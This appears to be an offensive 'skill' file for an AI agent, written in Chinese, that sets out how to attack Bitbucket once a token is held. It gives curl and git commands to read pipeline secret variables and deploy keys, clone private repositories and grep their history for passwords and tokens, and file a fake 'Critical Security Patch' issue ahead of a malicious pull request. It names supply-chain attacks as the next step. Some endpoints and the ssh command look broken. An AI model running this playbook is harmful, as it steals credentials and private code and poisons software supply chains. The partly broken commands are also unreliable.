---
name: bitbucket-attack
type: attack
category: code-repository
platform: bitbucket
severity: high
---

# Bitbucket 攻击技能

## 触发条件

- 有 Bitbucket 凭证
- 发现 Bitbucket 仓库
- 用户要求"攻击 Bitbucket"

## 前置检查

```bash
# 1. 验证 Token
curl -H "Authorization: Bearer TOKEN" https://api.bitbucket.org/2.0/user

# 2. 列出仓库
curl -H "Authorization: Bearer TOKEN" https://api.bitbucket.org/2.0/repositories
```

## 攻击方法

### 方法 1: Pipeline Variables 窃取

```bash
# 1. 列出仓库
curl -H "Authorization: Bearer TOKEN" \
  "https://api.bitbucket.org/2.0/repositories/OWNER/SLUG" | jq -r '.slug'

# 2. 获取 pipeline 变量
curl -H "Authorization: Bearer TOKEN" \
  "https://api.bitbucket.org/2.0/repositories/OWNER/REPO/pipelines_config/variables"

# 3. 获取特定变量
curl -H "Authorization: Bearer TOKEN" \
  "https://api.bitbucket.org/2.0/repositories/OWNER/REPO/pipelines_config/variables/VAR_UUID"
```

### 方法 2: Repository Clone 攻击

```bash
# 1. 克隆私有仓库
git clone https://TOKEN@bitbucket.org/OWNER/REPO.git

# 2. 搜索敏感信息
cd REPO
git log -p | grep -E "password|secret|token|key" > secrets.txt
git log --all --full-history | grep -E "password|secret|token|key"

# 3. 搜索所有分支
git log --all --oneline | head -50
git checkout -b sensitive-branch
```

### Method 3: SSH Key 窃取

```bash
# 1. 列出 deploy keys
curl -H "Authorization: Bearer TOKEN" \
  "https://api.bitbucket.org/2.0/repositories/OWNER/REPO/deploy-keys"

# 2. 获取 key 信息
curl -H "Authorization: Bearer TOKEN" \
  "https://api.bitbucket.org/2.0/repositories/OWNER/REPO/deploy-keys/KEY_ID"

# 3. 如果有写权限，无法直接读取
# 但可以通过添加 deploy key 然后 push
```

### Method 4: Issue 代码注入

```bash
# 1. 创建 issue
curl -X POST \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "title": "Fix: Critical Security Patch",
    "content": {
      "raw": "Please merge this urgent security fix!"
    }
  }' \
  https://api.bitbucket.org/2.0/repositories/OWNER/REPO/issues

# 2. 创建 malicious PR
# 创建分支并提交恶意代码
```

### Method 5: Workspace 攻击

```bash
# 1. 列出 workspace
curl -H "Authorization: Bearer TOKEN" \
  "https://api.bitbucket.org/20/workspaces"

# 2. 获取 workspace 代码
# SSH 配置 bitbucket 连接
ssh git@bitbucket.org/workspace-name
```

### Method 6: Snippet 攻击

```bash
# 1. 列出 snippets
curl -H "Authorization: Bearer TOKEN" \
  "https://api.bitbucket.org/2.0/repositories/OWNER/REPO/snippets"

# 2. 获取 snippet 代码
curl -H "Authorization: Bearer TOKEN" \
  "https://api.bitbucket.org/2.0/repositories/OWNER/REPO/snippets/SNIPPET_ID"
```

## 验证成功

```bash
# 成功获取变量
curl -H "Authorization: Bearer TOKEN" \
  "https://api.bitbucket.org/2.0/repositories/OWNER/REPO/pipelines_config/variables"

# 成功克隆仓库
git clone https://TOKEN@bitbucket.org/OWNER/REPO.git
cd REPO && ls -la

# 成功创建 issue
curl -H "Authorization: Bearer TOKEN" \
  "https://api.bitbucket.org/2.0/repositories/OWNER/REPO/issues"
```

## 下一步

1. 分析窃取的代码和密钥
2. 通过 Bitbucket PR 供应链攻击
3. 攻击其他代码仓库
